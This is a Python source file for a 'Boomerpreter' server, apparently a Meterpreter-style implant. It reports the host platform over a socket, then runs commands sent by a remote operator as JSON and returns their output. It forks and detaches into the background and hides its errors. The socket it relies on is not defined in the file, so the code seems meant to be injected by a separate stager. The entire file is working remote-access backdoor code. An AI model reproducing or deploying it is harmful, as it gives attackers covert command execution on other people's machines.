import json
from platform import platform
import subprocess
import os
import sys


class BoomerpreterServer:
    def __init__(self, s):
        self.socket = s
        self.operations = {
            "exit": "exit",
            "execute": "execute_command"
        }
    
    def recv_data(self):
        data = self.socket.recv(1024)
        data = data.decode()
        return json.loads(data)
        
    def send_data(self, data):
        try:
            data = json.dumps(data)
            data = data.encode()
        except Exception as e:
            data = str(e)
            data = json.dumps(data)
            data = data.encode()
        self.socket.send(data)
    
    def run(self):
        self.socket.send(platform().encode())
        while True:
            data_rcv = self.recv_data()
            func = data_rcv["function"]
            args = data_rcv["args"]
            try:
                opt = self.operations[func]
                if opt:
                    data = getattr(self, opt)(args)
            except Exception as e:
                data = "Error: Operation " + str(e) + " not found"
            if not data:
                continue
            if "exit" == data:
                break
            self.send_data(data)
    
    def exit(self):
        try:
            self.socket.close()
        except:
            pass
        return "exit"
    
    def execute_command(self, request):
        try:
            data = subprocess.Popen(request, stdin=subprocess.PIPE, stdout=subprocess.PIPE).communicate()[0]
        except:
            data = b"Error"
        return data.decode()

# s is the socket

if hasattr(os, 'fork'):
    pid = os.fork()
    if pid > 0:
        print("Meterpreter is running!") #test purposes
        sys.exit(0)
    if pid == 0:  
        if hasattr(os, 'setsid'):
            try:
                os.setsid()
            except OSError:
                pass

try:
    boomerpreter = BoomerpreterServer(s)
    boomerpreter.run()
except:
    pass